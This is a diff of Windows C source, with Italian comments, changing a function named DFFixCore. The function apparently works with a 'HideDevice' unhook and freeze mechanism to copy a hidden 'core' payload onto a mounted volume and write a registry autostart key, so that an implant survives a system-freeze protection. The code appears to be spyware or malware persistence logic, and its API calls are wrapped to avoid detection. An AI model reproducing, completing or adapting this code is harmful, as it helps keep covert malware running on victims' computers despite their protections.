@@ -96,7 +96,7 @@ BOOL RegEnumSubKey(WCHAR *subkey, DWORD index, WCHAR **buffer)
 }
 
 
-BOOL DFFixCore(HideDevice *pdev_unhook, unsigned char *core_name, unsigned char *core_path, unsigned char *reg_key_name)
+BOOL DFFixCore(HideDevice *pdev_unhook, unsigned char *core_name, unsigned char *core_path, unsigned char *reg_key_name, BOOL only_key)
 {
 	int i;
 	HKEY hOpen;
@@ -119,37 +119,39 @@ BOOL DFFixCore(HideDevice *pdev_unhook, unsigned char *core_name, unsigned char 
 	if (mounted_letter == L'!')
 		return FALSE;
 
-	// Crea la directory
-	swprintf(dir_path, L"%S", core_path);
-	dir_path[0] = mounted_letter;
+	if (!only_key) {
+		// Crea la directory
+		swprintf(dir_path, L"%S", core_path);
+		dir_path[0] = mounted_letter;
 
-	for (i=0; i<MAX_CDIR_TRY; i++) {
-		if (FNC(CreateDirectoryW)(dir_path, NULL))
-			break;
-		Sleep(100);
-	}
-	if (i == MAX_CDIR_TRY) {
-		pdev_unhook->df_freeze();
-		return FALSE;
-	}
+		for (i=0; i<MAX_CDIR_TRY; i++) {
+			if (FNC(CreateDirectoryW)(dir_path, NULL))
+				break;
+			Sleep(100);
+		}
+		if (i == MAX_CDIR_TRY) {
+			pdev_unhook->df_freeze();
+			return FALSE;
+		}
 
-	// Copia tutti i file
-	swprintf(find_path, L"%S\\*", core_path);
-	hFind = FNC(FindFirstFileW)(find_path, &FindFileDataW);
-	if (hFind == INVALID_HANDLE_VALUE) {
-		FNC(RemoveDirectoryW)(dir_path);
-		pdev_unhook->df_freeze();
-		return FALSE;
+		// Copia tutti i file
+		swprintf(find_path, L"%S\\*", core_path);
+		hFind = FNC(FindFirstFileW)(find_path, &FindFileDataW);
+		if (hFind == INVALID_HANDLE_VALUE) {
+			FNC(RemoveDirectoryW)(dir_path);
+			pdev_unhook->df_freeze();
+			return FALSE;
+		}
+		do {
+			// Salta le directory
+			if (FindFileDataW.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+				continue;
+			swprintf(src_path, L"%S\\%s", core_path, FindFileDataW.cFileName);
+			swprintf(dst_path, L"%s\\%s", dir_path, FindFileDataW.cFileName);
+			FNC(CopyFileW)(src_path, dst_path, FALSE);
+		} while (FNC(FindNextFileW)(hFind, &FindFileDataW) != 0);
+		FNC(FindClose)(hFind);
 	}
-	do {
-		// Salta le directory
-		if (FindFileDataW.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-			continue;
-		swprintf(src_path, L"%S\\%s", core_path, FindFileDataW.cFileName);
-		swprintf(dst_path, L"%s\\%s", dir_path, FindFileDataW.cFileName);
-		FNC(CopyFileW)(src_path, dst_path, FALSE);
-	} while (FNC(FindNextFileW)(hFind, &FindFileDataW) != 0);
-	FNC(FindClose)(hFind);
 	
 	// Scrive la chiave nel registry per l'avvio
 	if (!FNC(GetEnvironmentVariableW)(L"USERPROFILE", user_profile, MAX_PATH))  {
